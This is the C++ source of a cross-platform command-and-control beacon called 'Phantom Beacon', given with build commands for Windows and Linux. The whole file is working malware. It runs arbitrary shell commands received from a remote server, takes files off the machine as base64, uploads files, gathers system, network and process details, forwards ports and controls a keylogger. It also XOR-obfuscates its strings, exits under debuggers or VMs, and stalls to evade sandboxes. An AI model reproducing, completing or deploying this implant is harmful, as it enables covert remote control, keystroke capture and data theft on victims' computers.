// ============================================================================
//  main.cpp — Phantom Beacon Entry Point (Cross-Platform)
//  ──────────────────────────────────────────────────────────
//  Beacon loop: check-in → receive tasks → execute → send results → sleep.
//
//  Build (Windows - MinGW-w64):
//    x86_64-w64-mingw32-g++ -std=c++17 -O2 -s -o beacon.exe main.cpp \
//        -lwinhttp -lbcrypt -lws2_32 -static
//
//  Build (Windows - MSVC):
//    cl /EHsc /O2 /std:c++17 main.cpp /link winhttp.lib bcrypt.lib ws2_32.lib
//
//  Build (Linux / macOS):
//    g++ -std=c++17 -O2 -s -o beacon main.cpp -lcurl -lssl -lcrypto -lpthread
// ============================================================================

#ifdef _WIN32
    #ifndef WIN32_LEAN_AND_MEAN
    #define WIN32_LEAN_AND_MEAN
    #endif
    #include <windows.h>
#else
    #include <unistd.h>
    #include <sys/utsname.h>
    #include <fstream>
    #include <chrono>
    #include <thread>
    #include <cstring>
    #define Sleep(ms) std::this_thread::sleep_for(std::chrono::milliseconds(ms))
#endif
#include <cstdlib>
#include <cstdio>
#include <ctime>
#include <string>
#include <sstream>
#include <fstream>
#include <algorithm>

#include "evasion.h"
#include "crypto.h"
#include "network.h"
#include "recon.h"
#include "portfwd.h"
#include "keylogger.h"

// ── Minimal JSON Parser ────────────────────────────────────────────────────
// We avoid pulling in nlohmann/json to keep the binary tiny.
// This is a purpose-built parser for our specific C2 protocol.

namespace json_mini {

inline std::string get_string(const std::string& json, const std::string& key) {
    std::string key_q = XOR_DEC(XOR_STR("\"")).c_str() + key + XOR_DEC(XOR_STR("\"")).c_str();
    size_t key_pos = json.find(key_q);
    if (key_pos == std::string::npos) return "";

    size_t colon_pos = json.find(':', key_pos + key_q.length());
    if (colon_pos == std::string::npos) return "";

    size_t start_quote = json.find('"', colon_pos);
    if (start_quote == std::string::npos) return "";
    start_quote++;

    size_t end_quote = json.find('"', start_quote);
    if (end_quote == std::string::npos) return "";

    std::string val = json.substr(start_quote, end_quote - start_quote);
    std::string result;
    for (size_t i = 0; i < val.size(); ++i) {
        if (val[i] == '\\' && i + 1 < val.size()) {
            switch (val[i+1]) {
                case 'n':  result += '\n'; break;
                case 'r':  result += '\r'; break;
                case 't':  result += '\t'; break;
                case '\\': result += '\\'; break;
                case '"':  result += '"';  break;
                default:   result += val[i+1]; break;
            }
            i++;
        } else {
            result += val[i];
        }
    }
    return result;
}

// Extract the "tasks" array from C2 response: [{"task_id":"...","command":"..."},...]
struct Task {
    std::string task_id;
    std::string command;
};

inline std::vector<Task> parse_tasks(const std::string& json) {
    std::vector<Task> tasks;
    // Find the "tasks" array
    size_t arr_start = json.find(XOR_DEC(XOR_STR("\"tasks\":[")).c_str());
    if (arr_start == std::string::npos) return tasks;
    arr_start = json.find('[', arr_start);

    // Find each { ... } object in the array
    size_t pos = arr_start;
    while (true) {
        size_t obj_start = json.find('{', pos);
        if (obj_start == std::string::npos) break;
        size_t obj_end = json.find('}', obj_start);
        if (obj_end == std::string::npos) break;

        std::string obj = json.substr(obj_start, obj_end - obj_start + 1);
        Task t;
        t.task_id = get_string(obj, XOR_DEC(XOR_STR("task_id")).c_str());
        t.command = get_string(obj, XOR_DEC(XOR_STR("command")).c_str());
        if (!t.task_id.empty()) tasks.push_back(t);

        pos = obj_end + 1;
    }
    return tasks;
}

}  // namespace json_mini

// ── Shell Execution ────────────────────────────────────────────────────────

std::string run_shell_command(const std::string& cmd) {
    if (cmd.empty()) return XOR_DEC(XOR_STR("Error: empty command")).c_str();
    std::string output;

#ifdef _WIN32
    HANDLE hRead, hWrite;
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), nullptr, TRUE };
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return XOR_DEC(XOR_STR("Error: pipe creation failed")).c_str();
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si = { sizeof(STARTUPINFOA) };
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;

    PROCESS_INFORMATION pi = { 0 };
    // Use cmd.exe /c to support built-ins and pipes
    std::string full_cmd = XOR_DEC(XOR_STR("cmd.exe /c ")).c_str() + cmd;
    
    if (CreateProcessA(nullptr, (LPSTR)full_cmd.c_str(), nullptr, nullptr, TRUE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        CloseHandle(hWrite);
        char buffer[4096];
        DWORD bytesRead;
        while (ReadFile(hRead, buffer, sizeof(buffer) - 1, &bytesRead, nullptr) && bytesRead > 0) {
            buffer[bytesRead] = '\0';
            output += buffer;
            if (output.size() > 512 * 1024) break;
        }
        WaitForSingleObject(pi.hProcess, 5000); // 5s timeout
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        output = XOR_DEC(XOR_STR("Error: CreateProcess failed")).c_str();
        CloseHandle(hWrite);
    }
    CloseHandle(hRead);

#else
    int pipe_fd[2];
    if (pipe(pipe_fd) == -1) return XOR_DEC(XOR_STR("Error: pipe failed")).c_str();

    pid_t pid = fork();
    if (pid == 0) { // Child
        close(pipe_fd[0]);
        dup2(pipe_fd[1], STDOUT_FILENO);
        dup2(pipe_fd[1], STDERR_FILENO);
        execl(XOR_DEC(XOR_STR("/bin/sh")).c_str(), XOR_DEC(XOR_STR("sh")).c_str(), XOR_DEC(XOR_STR("-c")).c_str(), cmd.c_str(), (char*)NULL);
        _exit(1);
    } else if (pid > 0) { // Parent
        close(pipe_fd[1]);
        char buffer[4096];
        ssize_t n;
        while ((n = read(pipe_fd[0], buffer, sizeof(buffer) - 1)) > 0) {
            buffer[n] = '\0';
            output += buffer;
            if (output.size() > 512 * 1024) break;
        }
        close(pipe_fd[0]);
        waitpid(pid, nullptr, 0);
    } else {
        return XOR_DEC(XOR_STR("Error: fork failed")).c_str();
    }
#endif

    if (output.empty()) output = XOR_DEC(XOR_STR("(no output)\n")).c_str();
    return output;
}

// ── Command Dispatcher ─────────────────────────────────────────────────────

std::string dispatch_command(const std::string& cmd) {
    // Parse command and arguments
    std::istringstream iss(cmd);
    std::string action;
    iss >> action;

    if (action == XOR_DEC(XOR_STR("recon")).c_str()) {
        std::string path;
        std::getline(iss >> std::ws, path);
        return recon::format_human(path);
    }
    else if (action == XOR_DEC(XOR_STR("ls")).c_str() || action == XOR_DEC(XOR_STR("dir")).c_str()) {
        std::string path;
        std::getline(iss >> std::ws, path);
        if (path.empty()) path = ".";
        auto entries = recon::list_directory(path);
        std::ostringstream out;
        for (auto& e : entries) {
            out << (e.isDir ? XOR_DEC(XOR_STR("[DIR]  ")).c_str() : XOR_DEC(XOR_STR("[FILE] ")).c_str()) << e.name;
            if (!e.isDir) out << XOR_DEC(XOR_STR("  (")).c_str() << e.size << XOR_DEC(XOR_STR(" bytes)")).c_str();
            out << XOR_DEC(XOR_STR("\n")).c_str();
        }
        return out.str();
    }
    else if (action == XOR_DEC(XOR_STR("drives")).c_str()) {
        auto drives = recon::enumerate_drives();
        std::ostringstream out;
        for (auto& d : drives) {
            double totalGB = d.totalBytes / (1024.0 * 1024.0 * 1024.0);
            double freeGB  = d.freeBytes  / (1024.0 * 1024.0 * 1024.0);
            out << d.letter << XOR_DEC(XOR_STR("  [")).c_str() << d.type << XOR_DEC(XOR_STR("]")).c_str()
                << XOR_DEC(XOR_STR("  Total: ")).c_str() << static_cast<int>(totalGB) << XOR_DEC(XOR_STR(" GB")).c_str()
                << XOR_DEC(XOR_STR("  Free: ")).c_str()  << static_cast<int>(freeGB)  << XOR_DEC(XOR_STR(" GB\n")).c_str();
        }
        return out.str();
    }
    else if (action == XOR_DEC(XOR_STR("whoami")).c_str()) {
#ifdef _WIN32
        char user[256], computer[256];
        DWORD usize = sizeof(user), csize = sizeof(computer);
        GetUserNameA(user, &usize);
        GetComputerNameA(computer, &csize);
        return std::string(XOR_DEC(XOR_STR("User: ")).c_str()) + user + XOR_DEC(XOR_STR("\nComputer: ")).c_str() + computer + XOR_DEC(XOR_STR("\n")).c_str();
#else
        char hostname[256] = {0};
        gethostname(hostname, sizeof(hostname));
        const char* user = getenv("USER");
        if (!user) user = XOR_DEC(XOR_STR("unknown")).c_str();
        return std::string(XOR_DEC(XOR_STR("User: ")).c_str()) + user + XOR_DEC(XOR_STR("\nHostname: ")).c_str() + hostname + XOR_DEC(XOR_STR("\n")).c_str();
#endif
    }
    else if (action == XOR_DEC(XOR_STR("portfwd")).c_str()) {
        int localPort, remotePort;
        std::string remoteHost;
        if (iss >> localPort >> remoteHost >> remotePort) {
            return portfwd::start_forward(localPort, remoteHost, remotePort);
        }
        return XOR_DEC(XOR_STR("Usage: portfwd <local_port> <remote_host> <remote_port>")).c_str();
    }
    else if (action == XOR_DEC(XOR_STR("portfwd-stop")).c_str()) {
        return portfwd::stop_all_forwards();
    }
    else if (action == XOR_DEC(XOR_STR("download")).c_str()) {
        std::string filepath;
        std::getline(iss >> std::ws, filepath);
        if (filepath.empty()) return XOR_DEC(XOR_STR("Usage: download <filepath>")).c_str();

#ifdef _WIN32
        HANDLE hFile = CreateFileA(filepath.c_str(), GENERIC_READ, FILE_SHARE_READ,
            nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hFile == INVALID_HANDLE_VALUE)
            return XOR_DEC(XOR_STR("Error: Cannot open file ")).c_str() + filepath;

        DWORD fileSize = GetFileSize(hFile, nullptr);
        if (fileSize == INVALID_FILE_SIZE || fileSize > 10 * 1024 * 1024) {
            CloseHandle(hFile);
            return XOR_DEC(XOR_STR("Error: File too large or invalid")).c_str();
        }

        std::vector<BYTE> buffer(fileSize);
        DWORD bytesRead;
        ReadFile(hFile, buffer.data(), fileSize, &bytesRead, nullptr);
        CloseHandle(hFile);

        buffer.resize(bytesRead);
        return XOR_DEC(XOR_STR("FILE_B64:")).c_str() + crypto::base64_encode(buffer);
#else
        std::ifstream file(filepath, std::ios::binary);
        if (!file) return XOR_DEC(XOR_STR("Error: Cannot open file ")).c_str() + filepath;

        file.seekg(0, std::ios::end);
        size_t fileSize = file.tellg();
        if (fileSize > 10 * 1024 * 1024) return XOR_DEC(XOR_STR("Error: File too large")).c_str();
        file.seekg(0, std::ios::beg);

        std::vector<BYTE> buffer(fileSize);
        file.read(reinterpret_cast<char*>(buffer.data()), fileSize);
        buffer.resize(file.gcount());
        return XOR_DEC(XOR_STR("FILE_B64:")).c_str() + crypto::base64_encode(buffer);
#endif
    }
    else if (action == XOR_DEC(XOR_STR("upload")).c_str()) {
        std::string filepath, b64data;
        iss >> filepath >> b64data;
        if (filepath.empty() || b64data.empty())
            return XOR_DEC(XOR_STR("Usage: upload <filepath> <base64_data>")).c_str();

        auto data = crypto::base64_decode(b64data);
#ifdef _WIN32
        HANDLE hFile = CreateFileA(filepath.c_str(), GENERIC_WRITE, 0,
            nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hFile == INVALID_HANDLE_VALUE)
            return XOR_DEC(XOR_STR("Error: Cannot create file ")).c_str() + filepath;

        DWORD bytesWritten;
        WriteFile(hFile, data.data(), static_cast<DWORD>(data.size()), &bytesWritten, nullptr);
        CloseHandle(hFile);
        return XOR_DEC(XOR_STR("Uploaded ")).c_str() + std::to_string(bytesWritten) + XOR_DEC(XOR_STR(" bytes to ")).c_str() + filepath;
#else
        std::ofstream file(filepath, std::ios::binary);
        if (!file) return XOR_DEC(XOR_STR("Error: Cannot create file ")).c_str() + filepath;

        file.write(reinterpret_cast<const char*>(data.data()), data.size());
        return XOR_DEC(XOR_STR("Uploaded ")).c_str() + std::to_string(data.size()) + XOR_DEC(XOR_STR(" bytes to ")).c_str() + filepath;
#endif
    }
    else if (action == XOR_DEC(XOR_STR("sysinfo")).c_str()) {
        return recon::get_sysinfo();
    }
    else if (action == XOR_DEC(XOR_STR("netinfo")).c_str()) {
        return recon::get_netinfo();
    }
    else if (action == XOR_DEC(XOR_STR("processes")).c_str()) {
        return recon::get_processes();
    }
    else if (action == XOR_DEC(XOR_STR("find")).c_str()) {
        std::string root, pattern;
        iss >> root >> pattern;
        if (root.empty() || pattern.empty()) return XOR_DEC(XOR_STR("Usage: find <root> <pattern>")).c_str();
        return recon::find_files(root, pattern);
    }
    else if (action == XOR_DEC(XOR_STR("pwd")).c_str()) {
#ifdef _WIN32
        char buf[MAX_PATH];
        GetCurrentDirectoryA(MAX_PATH, buf);
        return std::string(buf) + XOR_DEC(XOR_STR("\n")).c_str();
#else
        char buf[1024];
        if (getcwd(buf, sizeof(buf))) return std::string(buf) + XOR_DEC(XOR_STR("\n")).c_str();
        return XOR_DEC(XOR_STR("Error getting current directory\n")).c_str();
#endif
    }
    else if (action == XOR_DEC(XOR_STR("cd")).c_str()) {
        std::string path;
        std::getline(iss >> std::ws, path);
        if (path.empty()) return XOR_DEC(XOR_STR("Usage: cd <path>")).c_str();
#ifdef _WIN32
        if (SetCurrentDirectoryA(path.c_str())) return XOR_DEC(XOR_STR("Directory changed to ")).c_str() + path + XOR_DEC(XOR_STR("\n")).c_str();
#else
        if (chdir(path.c_str()) == 0) return XOR_DEC(XOR_STR("Directory changed to ")).c_str() + path + XOR_DEC(XOR_STR("\n")).c_str();
#endif
        return XOR_DEC(XOR_STR("Error changing directory\n")).c_str();
    }
    else if (action == XOR_DEC(XOR_STR("cat")).c_str()) {
        std::string path;
        std::getline(iss >> std::ws, path);
        if (path.empty()) return XOR_DEC(XOR_STR("Usage: cat <file>")).c_str();
        std::ifstream f(path, std::ios::binary);
        if (!f) return XOR_DEC(XOR_STR("Error: Cannot open file ")).c_str() + path;
        
        f.seekg(0, std::ios::end);
        size_t size = f.tellg();
        if (size > 1 * 1024 * 1024) return XOR_DEC(XOR_STR("Error: File too large to cat (max 1MB). Use download.")).c_str();
        f.seekg(0, std::ios::beg);
        
        std::ostringstream ss;
        ss << f.rdbuf();
        return ss.str();
    }
    else if (action == XOR_DEC(XOR_STR("sleep")).c_str()) {
        return XOR_DEC(XOR_STR("SLEEP_SET")).c_str();
    }
    else if (action == XOR_DEC(XOR_STR("keylog")).c_str()) {
        std::string subCmd;
        iss >> subCmd;
        if (subCmd == XOR_DEC(XOR_STR("start")).c_str()) return keylogger::start();
        if (subCmd == XOR_DEC(XOR_STR("stop")).c_str())  return keylogger::stop();
        if (subCmd == XOR_DEC(XOR_STR("dump")).c_str())  return keylogger::dump();
        return XOR_DEC(XOR_STR("Usage: keylog <start|stop|dump>")).c_str();
    }
    else if (action == XOR_DEC(XOR_STR("shell")).c_str() || action == XOR_DEC(XOR_STR("exec")).c_str() || action == XOR_DEC(XOR_STR("run")).c_str()) {
        std::string shell_cmd;
        std::getline(iss >> std::ws, shell_cmd);
        if (shell_cmd.empty()) return XOR_DEC(XOR_STR("Usage: shell <command>")).c_str();
        return run_shell_command(shell_cmd);
    }
    else if (action == XOR_DEC(XOR_STR("exit")).c_str() || action == XOR_DEC(XOR_STR("kill")).c_str()) {
        return XOR_DEC(XOR_STR("EXIT")).c_str();
    }

    // Unknown built-in: execute as OS shell command (C2 interact mode)
    return run_shell_command(cmd);
}


// ── Generate Beacon ID ─────────────────────────────────────────────────────

std::string generate_beacon_id() {
#ifdef _WIN32
    char computer[256];
    DWORD csize = sizeof(computer);
    GetComputerNameA(computer, &csize);
    char hex[9];
    srand(static_cast<unsigned>(time(nullptr)) ^ GetCurrentProcessId());
    snprintf(hex, sizeof(hex), "%04X%04X", rand() & 0xFFFF, rand() & 0xFFFF);
    return std::string(XOR_DEC(XOR_STR("PHANTOM-")).c_str()) + computer + "-" + hex;
#else
    char hostname[256] = {0};
    gethostname(hostname, sizeof(hostname));
    char hex[9];
    srand(static_cast<unsigned>(time(nullptr)) ^ getpid());
    snprintf(hex, sizeof(hex), "%04X%04X", rand() & 0xFFFF, rand() & 0xFFFF);
    return std::string(XOR_DEC(XOR_STR("PHANTOM-")).c_str()) + hostname + "-" + hex;
#endif
}


// ── Beacon Main Loop ──────────────────────────────────────────────────────

void beacon_main(int argc, char** argv) {
    // 1. Anti-Analysis checks (Exit if debugging or VM detected)
    if (anti::is_debugger_present() || anti::is_vm()) {
        return; 
    }
    // 2. Stalling delay (Simulate CPU-heavy work to frustrate sandboxes)
    anti::stalling_delay(30);

#ifdef _WIN32
    srand(static_cast<unsigned>(time(nullptr)) ^ GetCurrentProcessId());
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);
#else
    srand(static_cast<unsigned>(time(nullptr)) ^ getpid());
#endif

    // Configure C2 connection
    net::C2Config cfg;
    cfg.beacon_id = generate_beacon_id();
    cfg.sleep_ms  = 5000;   // 5 second base interval
    cfg.jitter    = 30;     // ±30% jitter

    // Parse command line for C2 host:port (e.g., "beacon 192.168.1.100 8443")
    if (argc >= 2) {
        std::string host_str(argv[1]);
        cfg.host = std::wstring(host_str.begin(), host_str.end());
        if (argc >= 3) cfg.port = std::atoi(argv[2]);
    }
    cfg.use_https = (cfg.port == 443 || cfg.port == 8443);

    // ── Beacon Loop ────────────────────────────────────────────────────────
    bool alive = true;
    bool first_checkin = true;

    // Helper for escaping telemetry json
    auto escape_json = [](const std::string& s) {
        std::string res;
        for (char c : s) {
            if (c == '"') res += "\\\"";
            else if (c == '\\') res += "\\\\";
            else if (c == '\n') res += "\\n";
            else if (c == '\r') res += "\\r";
            else if (c == '\t') res += "\\t";
            else res += c;
        }
        return res;
    };

    while (alive) {
        // 1. Check in with C2
        std::string telemetry = "";
        if (first_checkin) {
            telemetry = XOR_DEC(XOR_STR("{\"sysinfo\":\"")).c_str() + escape_json(recon::get_sysinfo()) + 
                        XOR_DEC(XOR_STR("\",\"netinfo\":\"")).c_str() + escape_json(recon::get_netinfo()) + XOR_DEC(XOR_STR("\"}")).c_str();
        }
        std::string response = net::checkin(cfg, telemetry);
        if (!response.empty()) first_checkin = false;

        if (!response.empty()) {
            // 2. Parse tasks
            auto tasks = json_mini::parse_tasks(response);

            for (auto& task : tasks) {
                // 3. Execute each task
                std::string output = dispatch_command(task.command);

                // Handle special responses
                if (output == XOR_DEC(XOR_STR("EXIT")).c_str()) {
                    alive = false;
                    break;
                }
                if (output == XOR_DEC(XOR_STR("SLEEP_SET")).c_str()) {
                    std::istringstream iss(task.command);
                    std::string _; int newSleep;
                    iss >> _ >> newSleep;
                    if (newSleep >= 1000) {
                        cfg.sleep_ms = newSleep;
                        output = XOR_DEC(XOR_STR("Sleep set to ")).c_str() + std::to_string(newSleep) + XOR_DEC(XOR_STR("ms")).c_str();
                    } else {
                        output = XOR_DEC(XOR_STR("Invalid sleep value (minimum 1000ms)")).c_str();
                    }
                }

                // 4. Send result back to C2
                net::send_result(cfg, task.task_id, output);
            }
        }

        // 5. Sleep with jitter
        Sleep(cfg.get_sleep_ms());
    }

    // Cleanup
    portfwd::stop_all_forwards();
#ifdef _WIN32
    WSACleanup();
#endif
}


// ── Entry Point ────────────────────────────────────────────────────────────

#ifdef _WIN32
int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, int) {
    // Convert lpCmdLine to argc/argv
    int argc = 0;
    char** argv = nullptr;
    
    // Simple parsing: split lpCmdLine by spaces
    std::vector<std::string> args;
    args.push_back("beacon.exe");
    if (lpCmdLine && strlen(lpCmdLine) > 0) {
        std::istringstream iss(lpCmdLine);
        std::string token;
        while (iss >> token) args.push_back(token);
    }
    
    std::vector<char*> argv_ptrs;
    for (auto& a : args) argv_ptrs.push_back(&a[0]);
    
    beacon_main(static_cast<int>(argv_ptrs.size()), argv_ptrs.data());
    return 0;
}
#else
int main(int argc, char** argv) {
    beacon_main(argc, argv);
    return 0;
}
#endif

